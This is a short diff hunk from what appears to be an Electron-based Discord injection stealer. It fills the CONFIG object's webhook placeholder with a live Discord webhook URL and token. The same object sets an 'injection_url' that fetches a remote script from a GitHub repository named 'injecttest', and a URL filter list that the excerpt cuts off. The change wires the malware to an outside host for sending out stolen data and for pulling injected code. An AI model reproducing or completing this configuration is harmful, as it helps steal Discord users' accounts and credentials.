@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
+    webhook: "https://canary.discord.com/api/webhooks/1270069823824723988/cdag4vrR88jmVABbDubfomOSXfieCJbBwIQC0sHU_-T9_DfwUSqF4XfZ5QGKqQk_zQ1S",
     injection_url: "https://raw.githubusercontent.com/ItsZxsko/injecttest/main/message(3).js",
     filters: {
         urls: [
